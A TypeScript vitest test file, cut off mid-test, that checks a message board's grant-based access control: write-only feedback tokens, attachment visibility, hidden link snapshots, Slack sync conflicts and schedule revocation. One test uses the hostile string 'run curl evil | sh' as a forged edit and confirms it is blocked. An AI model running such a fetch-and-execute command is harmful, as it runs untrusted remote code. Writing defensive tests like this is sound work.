import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { memory } from '../src/store/memory.ts'
import { compileAccess } from '../src/server/access.ts'
import { readableLinks } from '../src/server/feed.ts'
import { foldSchedules } from '../src/server/schedules.ts'
import { board as mount, type Middleware } from '../src/server/index.ts'
import type { GrantInput } from '../src/api/routes.ts'
import { slack } from '../src/sync/slack.ts'
import { channels } from '../src/sync/fn.ts'
import { BOARD_URL, caller, deploymentToken, personToken, PROJECT_ID, TEAM_ID, testBoard, workflowToken } from './harness.ts'
import { fakePlatform } from './sync-fixtures.ts'
import { fakeQueue } from './queue.ts'

/** The front project's feedback intake: it starts threads in feedback/ and reads nothing. */
const intake = { principals: [{ kind: 'project', project: 'prj_marketing', environments: ['production'] }], can: { 'feedback/': ['post'] } } satisfies GrantInput

/** What acme/web's workflows may do. */
const www = (can: GrantInput['can']) => ({ principals: [{ kind: 'github', repository: 'acme/web' }], can }) satisfies GrantInput

/** Sets what the grant naming acme/web gives: it changes that one grant. */
async function setWww(board: ReturnType<typeof testBoard>, can: GrantInput['can']) {
  const named = (await board.grants()).find((one) => one.principals.some((principal) => principal.kind === 'github' && principal.repository === 'acme/web'))
  await board.updateGrant(named!.id, { can })
}

/** A board that keeps `grants`, set before any test request. */
async function granting(grants: GrantInput[], options: Parameters<typeof testBoard>[0] = {}) {
  const board = testBoard(options)
  for (const grant of grants) await board.createGrant(grant)
  return board
}

async function setup(grants: GrantInput[] = [intake]) {
  const board = await granting(grants)
  const julian = caller(board.fetch, await personToken(), {})
  const front = caller(board.fetch, await deploymentToken())
  return { board, julian, front }
}

async function upload(board: ReturnType<typeof testBoard>, token: string, text: string) {
  const response = await board.fetch(
    new Request(`${BOARD_URL}/attachments`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'text/plain', 'x-board-filename': 'notes.txt' },
      body: text,
    }),
  )
  return { status: response.status, id: ((await response.json()) as { attachment?: { id: string } }).attachment?.id }
}

const download = async (board: ReturnType<typeof testBoard>, token: string, id: string) =>
  (await board.fetch(new Request(`${BOARD_URL}/attachments/${id}`, { headers: { authorization: `Bearer ${token}` } }))).status

describe('a write-only source', () => {
  it('posts and gets its message back, and reads nothing', async () => {
    const { julian, front } = await setup()
    await julian('POST', '/messages', { channel: 'feedback/front', text: 'the team’s own notes' })
    const posted = await front('POST', '/messages', { channel: 'feedback/front', text: 'checkout is slow' })
    expect(posted).toMatchObject({ status: 201, body: { message: { text: 'checkout is slow', channel: 'feedback/front' } } })
    const id = posted.body.message.id

    expect((await front('GET', '/messages?channel=feedback/front')).body.messages).toEqual([])
    expect((await front('GET', '/threads')).body.threads).toEqual([])
    expect((await front('GET', '/channels')).body.channels).toEqual([])
    expect((await front('GET', '/events?after=0')).body.events).toEqual([])
    expect((await front('GET', `/messages/${id}`)).status).toBe(404)
    // Its own actor, so `vb whoami` and the inspector still know who it is.
    expect((await front('GET', '/actors')).body.actors.map((a: { id: string }) => a.id)).toEqual(['vercel:project:prj_marketing:production'])
    expect((await front('GET', '/me')).body).toMatchObject({ principal: 'vercel:project:prj_marketing:production', can: { 'feedback/': ['post'] } })
  })

  it('can’t address a thread, even its own, but can fix what it wrote', async () => {
    const { front } = await setup()
    const id = (await front('POST', '/messages', { channel: 'feedback', text: 'checkout is slow' })).body.message.id
    expect((await front('POST', '/messages', { re: id, text: 'and search' })).status).toBe(404)
    expect((await front('POST', `/messages/${id}/reactions`, { emoji: 'eyes' })).status).toBe(404)
    expect((await front('POST', `/messages/${id}/labels`, { set: { kind: 'bug' } })).status).toBe(404)
    expect((await front('POST', `/messages/${id}/edit`, { text: 'checkout is very slow' })).status).toBe(200)
    expect((await front('POST', `/messages/${id}/delete`, {})).status).toBe(200)
  })

  it('needs label to label what it posts', async () => {
    const { front } = await setup()
    const labeled = await front('POST', '/messages', { channel: 'feedback', text: 'slow', labels: { kind: 'task' } })
    expect(labeled).toMatchObject({ status: 403, body: { error: { message: "this token can't label in feedback" } } })
    const { front: labeler } = await setup([{ ...intake, can: { 'feedback/': ['post', 'label'] } }])
    expect((await labeler('POST', '/messages', { channel: 'feedback', text: 'slow', labels: { kind: 'task' } })).status).toBe(201)
  })

  it('streams bare cursors and nothing else', async () => {
    // A stream's cursor moves past what its caller can't see when a page of events ends: here, as it closes.
    const board = await granting([intake], { streamMaxMs: 1000 })
    const julian = caller(board.fetch, await personToken(), {})
    const controller = new AbortController()
    const response = await board.fetch(
      new Request(`${BOARD_URL}/events?after=0`, {
        headers: { authorization: `Bearer ${await deploymentToken()}`, accept: 'text/event-stream' },
        signal: controller.signal,
      }),
    )
    expect(response.status).toBe(200)
    const posted = (await julian('POST', '/messages', { channel: 'feedback', text: 'triaged' })).body.message.id
    const reader = response.body!.getReader()
    const decoder = new TextDecoder()
    let text = ''
    while (!text.includes(`id: ${posted}\n`)) {
      const { value, done } = await reader.read()
      if (done) break
      text += decoder.decode(value)
    }
    expect(text).toContain(`id: ${posted}\n`)
    expect(text).not.toContain('event: board')
    expect(text).not.toContain('triaged')
    controller.abort()
    await reader.cancel()
  })

  it('answers a caller that can see no one alike, whoever has the handle it typed', async () => {
    const board = await granting([intake], { scheduler: fakeQueue().scheduler })
    // A Vercel login's handle is its user ID: Julian's is `julian`.
    const julian = caller(board.fetch, await personToken('julian'), {})
    const front = caller(board.fetch, await deploymentToken())
    await julian('POST', '/messages', { channel: 'dev', text: 'hi' })
    // A person and a project's deployments go by sam.
    for (const sam of [await personToken('sam'), await deploymentToken('sam', 'prj_sam', 'production')]) await caller(board.fetch, sam, {})('POST', '/messages', { channel: 'dev', text: 'hi' })
    // Without g2's every project on the team, front only posts to feedback: it reads nothing, and sees no one.
    await board.revokeGrant('g2')
    // One has the handle, two share one, and no one has the last: nothing in the answers tells them apart.
    const answers = []
    for (const handle of ['julian', 'sam', 'nobody']) {
      const text = `thanks @${handle}`
      const posted = await front('POST', '/messages', { channel: 'feedback', text })
      const scheduled = await front('POST', '/schedules', { channel: 'feedback', text, in: '1h' })
      const edited = await front('POST', `/messages/${posted.body.message.id}/edit`, { text: `${text}!` })
      expect([posted.status, posted.body.message.text, scheduled.status, scheduled.body.schedule.text, edited.status], handle).toEqual([201, text, 201, text, 200])
      // Each handle is a mention of no one, with no word of who goes by it.
      const none = [{ written: `@${handle}`, actor: null, candidates: [] }]
      expect([posted.body.mentions, scheduled.body.mentions, edited.body.mentions], handle).toEqual([none, none, none])
      answers.push([Object.keys(posted.body).sort(), Object.keys(posted.body.message).sort(), Object.keys(scheduled.body).sort(), Object.keys(edited.body).sort()])
    }
    expect(answers[1]).toEqual(answers[0])
    expect(answers[2]).toEqual(answers[0])
    // What it typed is kept as text, which a filter still finds for Julian.
    expect((await julian('GET', '/threads?channel=feedback&mentions=me')).body.threads.map((t: { message: { text: string } }) => t.message.text)).toEqual(['thanks @julian!'])
  })

  it("tells a caller who it mentioned where it can't read what it wrote, and still shows it no ID there", async () => {
    const board = await granting([intake])
    const julian = caller(board.fetch, await personToken('julian'), {})
    // Front reads dev, where Julian wrote, as every project on the team does, and only posts to feedback.
    const front = caller(board.fetch, await deploymentToken())
    await julian('POST', '/messages', { channel: 'dev', text: 'hi' })
    const posted = await front('POST', '/messages', { channel: 'feedback', text: 'thanks @julian', id: 'thanks-2' })
    expect(posted.body.mentions).toEqual([{ written: '@julian', actor: { id: 'vercel:user:julian', handle: 'julian', name: 'julian' }, candidates: [] }])
    // Its own post, read back, masks who it mentions, as any exact mention there; whoever reads feedback has it.
    expect((await front('GET', '/posts/thanks-2')).body.message.text).toBe('thanks @…')
    expect((await julian('GET', '/messages?channel=feedback')).body.messages.map((m: { text: string }) => m.text)).toEqual(['thanks @[vercel:user:julian]'])
  })

  it('never shows a write-only caller an actor ID in its own post or schedule read back', async () => {
    const board = await granting([intake], { scheduler: fakeQueue().scheduler })
    const front = caller(board.fetch, await deploymentToken())
    const text = 'thanks @julian, cc @[vercel:user:u_ada] and @[ada@vercel.com]'
    expect((await front('POST', '/messages', { channel: 'feedback', text, id: 'thanks-1' })).status).toBe(201)
    const scheduled = (await front('POST', '/schedules', { channel: 'feedback', text, in: '1h' })).body.schedule
    const masked = 'thanks @julian, cc @… and @…'
    expect((await front('GET', '/posts/thanks-1')).body.message.text).toBe(masked)
    expect(((await front('GET', '/schedules')).body.schedules as { text: string }[]).map((schedule) => schedule.text)).toEqual([masked])
    expect((await front('POST', `/schedules/${scheduled.id}/cancel`, {})).body.schedule.text).toBe(masked)
  })

  it("finds a mention by someone's other name only for a caller that reads every channel", async () => {
    const board = await granting([{ ...intake, can: { 'feedback/': ['read', 'post'] } }])
    // Without g2's every project on the team: front may read only feedback.
    await board.revokeGrant('g2')
    const julian = caller(board.fetch, await personToken(), {})
    const front = caller(board.fetch, await deploymentToken())
    // Sam writes only in secret, which front can't read; feedback mentions @sam, and his agent.
    await caller(board.fetch, await personToken('u_sam'), {})('POST', '/messages', { channel: 'secret', text: 'hi' })
    for (const text of ['@u_sam can you look?', 'over to @u_sam/claude', 'cc @[vercel:user:u_sam]']) await julian('POST', '/messages', { channel: 'feedback', text })
    const texts = async (as: typeof julian, mentions: string) =>
      ((await as('GET', `/threads?channel=feedback&mentions=${encodeURIComponent(mentions)}`)).body.threads as { message: { text: string } }[]).map((t) => t.message.text)
    // Julian sees Sam, so his handle for him was stored as a mention of him; Sam's agent has never written, so its handle is text.
    expect(await texts(julian, 'vercel:user:u_sam')).toEqual(['@[vercel:user:u_sam] can you look?', 'over to @u_sam/claude', 'cc @[vercel:user:u_sam]'])
    // Front gets what it names, as written: no saying that vercel:user:u_sam goes by u_sam.
    expect(await texts(front, 'vercel:user:u_sam')).toEqual(['@[vercel:user:u_sam] can you look?', 'cc @[vercel:user:u_sam]'])
    expect(await texts(front, 'u_sam')).toEqual(['over to @u_sam/claude'])
  })

  for (const middleware of [undefined, [async ({ next }) => next()] satisfies Middleware[]]) {
    it(`gets back a retry as it landed, not what others added since (${middleware ? 'with' : 'without'} middleware)`, async () => {
      const board = await granting([intake], middleware ? { middleware } : {})
      const julian = caller(board.fetch, await personToken(), {})
      const front = caller(board.fetch, await deploymentToken())
      const sent = { channel: 'feedback/front', text: 'checkout is slow', id: 'feedback-checkout' }
      const posted = await front('POST', '/messages', sent)
      expect(posted.status).toBe(201)
      const id = posted.body.message.id

      await julian('POST', `/messages/${id}/labels`, { set: { kind: 'bug', owner: 'payments' } })
      await julian('POST', `/messages/${id}/reactions`, { emoji: 'eyes' })
      await julian('POST', '/messages', { re: id, text: 'looking into it' })
      expect((await front('POST', `/messages/${id}/edit`, { text: 'checkout is very slow' })).status).toBe(200)

      const retried = await front('POST', '/messages', sent)
      expect(retried.body.message).toEqual(posted.body.message)
      expect((await front('GET', `/messages/${id}`)).status).toBe(404)
    })
  }
})

describe('attachments', () => {
  it('are readable by their uploader, and where a message carrying them is', async () => {
    const { board, julian, front } = await setup([intake, www({ 'feedback/': ['post'], ci: ['read'] })])
    const ci = caller(board.fetch, await workflowToken())
    const file = await upload(board, await deploymentToken(), 'repro steps')
    expect(file.status).toBe(201)
    expect(await download(board, await deploymentToken(), file.id!)).toBe(200)
    expect(await download(board, await workflowToken(), file.id!)).toBe(404)
    // A file can't move from where its uploader put it into a channel someone else posts in.
    expect((await ci('POST', '/messages', { channel: 'feedback', text: 'mine now', attachments: [file.id] })).status).toBe(404)

    expect((await front('POST', '/messages', { channel: 'feedback', text: 'see notes', attachments: [file.id] })).status).toBe(201)
    expect(await download(board, await personToken(), file.id!)).toBe(200)
    expect(await download(board, await workflowToken(), file.id!)).toBe(404)
    const shared = await upload(board, await personToken(), 'build log')
    await julian('POST', '/messages', { channel: 'ci', text: 'log', attachments: [shared.id] })
    expect(await download(board, await workflowToken(), shared.id!)).toBe(200)
  })

  it('go into a schedule only where its creator may read them', async () => {
    const board = await granting([www({ ci: ['read', 'post'] })], { scheduler: fakeQueue().scheduler })
    const file = await upload(board, await personToken(), 'the plan')
    await caller(board.fetch, await personToken())('POST', '/messages', { channel: 'security', text: 'plan', attachments: [file.id] })
    const ci = caller(board.fetch, await workflowToken())
    expect((await ci('POST', '/schedules', { channel: 'ci', text: 'mine later', in: '1h', attachments: [file.id] })).status).toBe(404)
    const mine = await upload(board, await workflowToken(), 'build log')
    expect((await ci('POST', '/schedules', { channel: 'ci', text: 'log later', in: '1h', attachments: [mine.id] })).status).toBe(201)
  })

  it('need post somewhere to upload', async () => {
    const { board } = await setup([www({ '*': ['read'] })])
    expect((await upload(board, await workflowToken(), 'x')).status).toBe(403)
  })
})

describe('x-board-can', () => {
  it('narrows what a full-access token reads', async () => {
    const { board, julian } = await setup()
    await julian('POST', '/messages', { channel: 'dev', text: 'in dev' })
    await julian('POST', '/messages', { channel: 'security', text: 'in security' })
    const pi = caller(board.fetch, await personToken(), { 'x-board-can': 'dev/=read,post' })
    expect((await pi('GET', '/threads')).body.threads.map((t: { message: { text: string } }) => t.message.text)).toEqual(['in dev'])
    expect((await pi('GET', '/messages?channel=security')).body.messages).toEqual([])
    expect((await pi('GET', '/channels')).body.channels.map((c: { path: string }) => c.path)).toEqual(['dev'])
  })
})

describe('a reader of some channels', () => {
  it('gets a cursor that misses no post, even in a channel newer than its read', async () => {
    const store = memory()
    let board!: ReturnType<typeof testBoard>
    let landInNew: (() => Promise<unknown>) | null = null
    // A post to a new channel lands between the board's read of the channels and its read of the tables.
    const tables = {
      ...store.tables,
      async threads(...args: Parameters<typeof store.tables.threads>) {
        const land = landInNew
        landInNew = null
        await land?.()
        return store.tables.threads(...args)
      },
    }
    board = testBoard({ store: { ...store, tables } })
    const julian = caller(board.fetch, await personToken(), {})
    await julian('POST', '/messages', { channel: 'dev', text: 'old' })
    const pi = caller(board.fetch, await personToken(), { 'x-board-can': 'dev/=read' })
    landInNew = () => julian('POST', '/messages', { channel: 'dev/new', text: 'fresh' })
    const page = await pi('GET', '/threads')
    const seen = page.body.threads.map((t: { message: { text: string } }) => t.message.text)
    const tail = await pi('GET', `/events?after=${page.body.cursor}`)
    const later = tail.body.events.flatMap((e: { message?: { text: string } }) => (e.message ? [e.message.text] : []))
    expect([...seen, ...later]).toContain('fresh')
  })
})

describe('links', () => {
  it('show nothing of a linked board message the reader can’t read', () => {
    const channelOf = (id: number) => (id === 7 ? 'security' : undefined)
    const link = { url: 'https://slack.test/p1', message: 7, snapshot: { author: 'ada', text: 'the key is…', createdAt: null, files: [] }, unavailable: null }
    const hidden = { url: link.url, message: null, snapshot: null, unavailable: 'not_readable' }
    expect(readableLinks([link], { access: compileAccess({ 'dev/': ['read'] }), channelOf })).toEqual([hidden])
    expect(readableLinks([link], { access: compileAccess({ security: ['read'] }), channelOf })).toEqual([{ ...link, message: '7' }])
    // One the reader's lookup doesn't have shows nothing either.
    expect(readableLinks([{ ...link, message: 8 }], { access: compileAccess({ security: ['read'] }), channelOf })).toEqual([hidden])
  })

  it('show nothing of it on any route', async () => {
    const s = fakePlatform('slack')
    const board = await granting([{ principals: [{ kind: 'project', project: 'prj_sync', environments: ['production'] }], can: { open: 'all', security: ['read'] } }], {
      sync: { slack: slack({ adapter: s.adapter }, channels({ C2: 'security' })) },
    })
    const webhook = (body: unknown) =>
      board.fetch(new Request(`${BOARD_URL}/webhooks/slack`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }))
    const julian = caller(board.fetch, await personToken())
    const secret = '1791322095.443859'
    await webhook({ type: 'message', threadId: `slack:C2:${secret}`, id: secret, text: 'the key is hunter2', user: 'U_ADA', name: 'Ada' })
    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=security')).body.messages).toHaveLength(1))
    const [linked] = (await julian('GET', '/messages?channel=security')).body.messages
    // A link to it with its snapshot, in a channel others read: a board's sync no longer makes one
    // across channels, but a log can hold one from before, and a sync elsewhere that reads it can
    // import one.
    const permalink = `https://acme.slack.com/archives/C2/p${secret.replace('.', '')}`
    const sync = caller(board.fetch, await deploymentToken('sync', 'prj_sync'))
    expect((await sync('POST', '/watchers', { watch: {}, sync: [{ key: 'helpdesk', platform: 'slack' }] })).status).toBe(200)
    const snapshot = { author: 'Ada', text: 'the key is hunter2', createdAt: null, files: [] }
    const author = { id: 'helpdesk:user:U_JB', handle: 'jb', name: 'JB', avatar: null, isBot: false }
    const imported = await sync('POST', '/sync/imports', { op: 'post', author, from: 'helpdesk', channel: 'open', text: `see ${permalink}`, links: [{ url: permalink, message: linked.id, snapshot, unavailable: null }] })
    expect(imported.status).toBe(200)
    expect((await julian('GET', '/messages?channel=open')).body.messages[0].links[0].snapshot.text).toBe('the key is hunter2')

    const open = caller(board.fetch, await personToken(), { 'x-board-can': 'open=read' })
    const hidden = { message: null, snapshot: null, unavailable: 'not_readable' }
    const [message] = (await open('GET', '/messages?channel=open')).body.messages
    expect(message.links[0], '/messages').toMatchObject(hidden)
    expect((await open('GET', '/threads')).body.threads[0].message.links[0], '/threads').toMatchObject(hidden)
    expect((await open('GET', `/messages/${message.id}`)).body.message.links[0], '/messages/:id').toMatchObject(hidden)
    expect(JSON.stringify((await open('GET', '/events?after=0')).body.events), '/events').not.toContain('hunter2')
  })
})

describe('sync', () => {
  /** security/ mirrors Slack's C1, where a thread is already on the board; a workflow syncs in ci/ only. */
  async function mirrored() {
    const s = fakePlatform('slack')
    const board = await granting([www({ 'ci/': ['read', 'post', 'sync'] })], {
      sync: { slack: slack({ adapter: s.adapter }, channels({ C1: 'security' })) },
    })
    const webhook = (body: unknown) =>
      board.fetch(new Request(`${BOARD_URL}/webhooks/slack`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }))
    const julian = caller(board.fetch, await personToken())
    await webhook({ type: 'message', threadId: 'slack:C1:100', id: '100', text: 'incident root', user: 'U_ADA' })
    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=security')).body.messages).toHaveLength(1))
    const [root] = (await julian('GET', '/messages?channel=security')).body.messages
    return { s, webhook, julian, root, ci: caller(board.fetch, await workflowToken()) }
  }

  it('can’t take over a platform thread another thread is synced with', async () => {
    const { webhook, julian, root, ci } = await mirrored()
    const tap = (await ci('POST', '/messages', { channel: 'ci/x', text: 'tap' })).body.message.id
    const taken = await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C1:100' })
    expect(taken).toMatchObject({ status: 409, body: { error: { code: 'already_synced', message: 'slack:C1:100 is already synced with another thread' } } })
    expect((await ci('POST', '/messages', { channel: 'ci/y', text: 'tap', sync: ['slack:C1:100'] })).status).toBe(409)
    // Someone who reads that thread learns which it is.
    const mine = (await julian('POST', '/messages', { channel: 'dev', text: 'mine' })).body.message.id
    expect((await julian('POST', `/messages/${mine}/sync`, { target: 'slack:C1:100' })).body.error.message).toBe(`slack:C1:100 is already synced with #${root.id}`)

    await webhook({ type: 'message', threadId: 'slack:C1:100', id: '101', text: 'the secret reply', user: 'U_ADA' })
    await vi.waitFor(async () => expect((await julian('GET', `/messages/${root.id}`)).body.replies.map((r: { text: string }) => r.text)).toEqual(['the secret reply']))
    expect((await ci('GET', '/threads?channel=ci/')).body.threads.map((t: { message: { text: string } }) => t.message.text)).toEqual(['tap'])
  })

  it('doesn’t tell a caller that reads one channel where other threads sync', async () => {
    const { julian, root, ci } = await mirrored()
    expect((await julian('POST', `/messages/${root.id}/sync`, { target: 'slack:C9:900.1' })).body).toMatchObject({ attached: true })
    const all = (await julian('GET', '/events?after=0&all=1')).body.events.map((event: { type: string }) => event.type)
    expect(all).toContain('thread.synced')
    await ci('POST', '/messages', { channel: 'ci/x', text: 'build' })
    const events = (await ci('GET', '/events?after=0&all=1')).body.events
    expect(events.map((event: { type: string }) => event.type)).toEqual(['message.posted'])
  })

  it('still attaches a thread to one no thread has', async () => {
    const { ci } = await mirrored()
    const tap = (await ci('POST', '/messages', { channel: 'ci/x', text: 'build' })).body.message.id
    expect((await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C9:900.1' })).body).toEqual({ target: 'slack:C9:900.1', attached: true })
    expect((await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C9:900.1' })).body).toEqual({ target: 'slack:C9:900.1', attached: false })
  })
})

describe('one principal, two grants', () => {
  // A repo's workflows share `github:repo:<id>`: deploy.yml reads and posts in ci/, a pull request's run only posts there.
  const deployYml = { kind: 'github' as const, repository: 'acme/web', event: 'push', workflow: 'deploy.yml', branch: 'main' }
  const pullRequests = { kind: 'github' as const, repository: 'acme/web', event: 'pull_request' }
  const grants = [
    { principals: [deployYml], can: { 'ci/': ['read', 'post'] } },
    { principals: [pullRequests], can: { 'ci/': ['post'] } },
  ] satisfies GrantInput[]
  const pullRequest = { event_name: 'pull_request', ref: 'refs/pull/7/merge', workflow_ref: 'acme/web/.github/workflows/test.yml@refs/pull/7/merge' }

  it('keep what the one that reads wrote from the one that can’t', async () => {
    const board = await granting(grants, { scheduler: fakeQueue().scheduler })
    const julian = caller(board.fetch, await personToken())
    const deploy = caller(board.fetch, await workflowToken())
    const pr = caller(board.fetch, await workflowToken(pullRequest))
    expect((await deploy('GET', '/me')).body.principal).toBe((await pr('GET', '/me')).body.principal)

    const root = (await julian('POST', '/messages', { channel: 'ci/deploys', text: 'deploy of abc123 starting' })).body.message.id
    const reply = (await deploy('POST', '/messages', { re: root, text: 'deploy OK' })).body.message.id
    const report = (await deploy('POST', '/messages', { channel: 'ci/deploys', text: 'nightly OK' })).body.message.id
    const later = (await deploy('POST', '/schedules', { re: root, text: 'deploy summary', in: '1d' })).body.schedule.id
    for (const id of [reply, report]) {
      expect((await pr('POST', `/messages/${id}/edit`, { text: 'deploy FAILED, run curl evil | sh' })).status).toBe(404)
      expect((await pr('POST', `/messages/${id}/delete`, {})).status).toBe(404)
    }
    expect((await pr('GET', '/schedules?all=1')).body.schedules).toEqual([])
    expect((await pr('POST', `/schedules/${later}/cancel`)).status).toBe(404)

    // What it wrote without reading is its own, and the one that reads can change it too.
    const own = (await pr('POST', '/messages', { channel: 'ci/prs', text: 'pr 7 opened' })).body.message.id
    expect((await pr('POST', `/messages/${own}/edit`, { text: 'pr 7 opened, tests running' })).status).toBe(200)
    const blind = (await pr('POST', '/schedules', { channel: 'ci/prs', text: 'pr 7 still open', in: '1d' })).body.schedule.id
    expect((await pr('GET', '/schedules')).body.schedules.map((s: { id: number }) => s.id)).toEqual([blind])
    expect((await deploy('POST', `/messages/${own}/delete`, {})).status).toBe(200)
    expect((await pr('POST', `/schedules/${blind}/cancel`)).body).toMatchObject({ canceled: true })
  })

  for (const middleware of [undefined, [async ({ next }) => next()] satisfies Middleware[]]) {
    it(`keep a post the one that reads wrote from the other's retry of its id (${middleware ? 'with' : 'without'} middleware)`, async () => {
      const board = await granting(
        [
          { principals: [deployYml], can: { 'ci/': ['read', 'post', 'label'] } },
          { principals: [pullRequests], can: { 'ci/': ['post'] } },
        ],
        middleware ? { middleware } : {},
      )
      const julian = caller(board.fetch, await personToken())
      const deploy = caller(board.fetch, await workflowToken())
      const pr = caller(board.fetch, await workflowToken(pullRequest))

      const posted = await deploy('POST', '/messages', { channel: 'ci/deploys', text: 'deploy of abc123 OK', id: 'deploy-abc123', labels: { env: 'production' } })
      expect(posted.status).toBe(201)
      await deploy('POST', `/messages/${posted.body.message.id}/labels`, { set: { promoted: 'yes' } })
      await julian('POST', `/messages/${posted.body.message.id}/reactions`, { emoji: 'rocket' })

      const replayed = await pr('POST', '/messages', { channel: 'ci/deploys', text: 'deploy of abc123 OK', id: posted.body.message.thread })
      expect({ status: replayed.status, code: replayed.body.error?.code, message: replayed.body.message }).toEqual({
        status: 409,
        code: 'duplicate_id',
        message: undefined,
      })
    })
  }

  it('re-checks post on what it wrote', async () => {
    const board = await granting([www({ ci: ['post'] })])
    const ci = caller(board.fetch, await workflowToken())
    const id = (await ci('POST', '/messages', { channel: 'ci', text: 'nightly' })).body.message.id
    // Setting its grant again changes what it gives.
    await setWww(board, { dev: ['post'] })
    expect(await ci('POST', `/messages/${id}/edit`, { text: 'nightly, again' })).toMatchObject({ status: 403, body: { error: { message: "this token can't post in ci" } } })
    expect((await ci('POST', `/messages/${id}/delete`, {})).status).toBe(403)
  })
})

describe('schedules', () => {
  const T0 = Date.parse('2026-10-07T12:00:00.000Z')
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ['Date'] })
    vi.setSystemTime(T0)
  })
  afterEach(() => vi.useRealTimers())

  /** A workflow's schedule, made while its grant gives `before` and due once the grant gives `after`. */
  async function regranted(before: GrantInput['can'], after: GrantInput['can']) {
    const queue = fakeQueue()
    const board = await granting([www(before)], { scheduler: queue.scheduler })
    const ci = caller(board.fetch, await workflowToken())
    const scheduled = await ci('POST', '/schedules', { channel: 'ci', text: 'nightly: green', in: '1h' })
    expect(scheduled.status).toBe(201)
    await setWww(board, after)
    await new Promise((resolve) => setTimeout(resolve, 20))
    vi.setSystemTime(T0 + 61 * 60_000)
    await queue.fire()
    await new Promise((resolve) => setTimeout(resolve, 20))
    const julian = caller(board.fetch, await personToken())
    const [schedule] = (await julian('GET', '/schedules?all=1')).body.schedules
    return { schedule, messages: (await julian('GET', '/messages?channel=ci')).body.messages }
  }

  it('send with what their creator may do now', async () => {
    const { schedule, messages } = await regranted({ ci: ['post'] }, { ci: ['read', 'post'] })
    expect(schedule).toMatchObject({ state: 'done', sent: 1 })
    expect(messages).toMatchObject([{ text: 'nightly: green', by: { principal: 'github:repo:123456' } }])
  })

  it('are canceled as revoked once their creator can’t post', async () => {
    const { schedule, messages } = await regranted({ ci: ['post'] }, { ci: ['read'] })
    expect(schedule).toMatchObject({ state: 'canceled', sent: 0, canceled: { reason: 'revoked' } })
    expect(messages).toEqual([])
  })

  it('are sent by the latest deployment, under the grants as they are then, even while an earlier one still gets their timers', async () => {
    const store = memory()
    const settle = () => new Promise((resolve) => setTimeout(resolve, 20))
    const deploy = (id: string) => {
      vi.stubEnv('VERCEL_DEPLOYMENT_ID', id)
      const queue = fakeQueue()
      const deployed = testBoard({ store, scheduler: queue.scheduler })
      vi.unstubAllEnvs()
      return { queue, board: deployed, fetch: deployed.fetch }
    }
    const before = deploy('dpl_before')
    await before.board.createGrant(www({ ci: ['post'] }))
    expect((await caller(before.fetch, await workflowToken())('POST', '/schedules', { channel: 'ci', text: 'nightly: green', in: '1h' })).status).toBe(201)
    const after = deploy('dpl_after')
    const julian = async (method: string, path: string) => caller(after.fetch, await personToken())(method, path)
    await julian('GET', '/me')
    await vi.waitFor(() => expect(after.queue.timers).toHaveLength(1))

    // The earlier deployment's timer sends nothing, though its creator may still post: the later one took the schedules over.
    vi.setSystemTime(T0 + 61 * 60_000)
    await before.queue.fire()
    await settle()
    expect((await julian('GET', '/messages?channel=ci')).body.messages).toEqual([])

    await setWww(after.board, { ci: ['read'] })
    await after.queue.fire()
    await vi.waitFor(async () =>
      expect((await julian('GET', '/schedules?all=1')).body.schedules).toMatchObject([{ state: 'canceled', sent: 0, canceled: { reason: 'revoked' } }]),
    )
    expect((await julian('GET', '/messages?channel=ci')).body.messages).toEqual([])
  })

  it('are canceled by their creator, or by manage', async () => {
    const queue = fakeQueue()
    const board = await granting([www({ ci: ['post', 'read'] })], { scheduler: queue.scheduler })
    const ci = caller(board.fetch, await workflowToken())
    const julian = caller(board.fetch, await personToken())
    const mine = (await ci('POST', '/schedules', { channel: 'ci', text: 'mine', in: '1h' })).body.schedule.id
    const theirs = (await julian('POST', '/schedules', { channel: 'ci', text: 'theirs', in: '1h' })).body.schedule.id
    expect((await ci('POST', `/schedules/${mine}/cancel`)).body).toMatchObject({ canceled: true })
    expect(await ci('POST', `/schedules/${theirs}/cancel`)).toMatchObject({ status: 403, body: { error: { message: "this token can't manage ci" } } })
    expect((await julian('POST', `/schedules/${theirs}/cancel`)).body).toMatchObject({ canceled: true })
  })

  it('are their creator’s only where it can post: one token narrowed two ways is two callers', async () => {
    const board = testBoard({ scheduler: fakeQueue().scheduler })
    const dev = caller(board.fetch, await personToken(), { 'x-board-can': 'dev/=post' })
    const ci = caller(board.fetch, await personToken(), { 'x-board-can': 'ci/=read,post' })
    const id = (await dev('POST', '/schedules', { channel: 'dev', text: 'in dev', in: '1h' })).body.schedule.id
    expect((await dev('GET', '/schedules')).body.schedules).toMatchObject([{ id, text: 'in dev' }])
    expect((await ci('GET', '/schedules')).body.schedules).toEqual([])
    expect((await ci('POST', `/schedules/${id}/cancel`)).status).toBe(404)
    expect((await dev('POST', `/schedules/${id}/cancel`)).body).toMatchObject({ canceled: true })
  })

  it('keep plain data in their state, which A2 clones and snapshots', () => {
    const as = {
      author: { actor: 'github:repo:123456', principal: 'github:repo:123456', profile: null },
      principal: { id: 'github:repo:123456', kind: 'workflow' as const, handle: 'acme/web', scope: 'ci=post' },
      actor: { id: 'github:repo:123456', kind: 'workflow' as const, handle: 'acme/web', name: 'acme/web', avatar: null },
    }
    const payload = { channel: 'ci', re: null, text: 'nightly', labels: {}, noSync: false, first: T0, every: null, until: null, times: null, as }
    const event = { index: 1, type: 'schedule.created', createdAt: T0, payload } as unknown as Parameters<typeof foldSchedules>[1]
    const state = foldSchedules({ byId: {}, takeover: null }, event)
    expect(structuredClone(state)).toEqual(state)
  })

  /** Fires the queue an hour on and reads the board's only schedule back. */
  async function sendAndRead(fetch: (request: Request) => Promise<Response>, queue: ReturnType<typeof fakeQueue>) {
    await new Promise((resolve) => setTimeout(resolve, 20))
    vi.setSystemTime(T0 + 61 * 60_000)
    await queue.fire()
    await new Promise((resolve) => setTimeout(resolve, 20))
    const [schedule] = (await caller(fetch, await personToken())('GET', '/schedules?all=1')).body.schedules
    return schedule
  }

  it('send from the board’s own code and its own production', async () => {
    vi.stubEnv('VERCEL_ENV', 'production')
    try {
      for (const make of ['client', 'production'] as const) {
        vi.setSystemTime(T0)
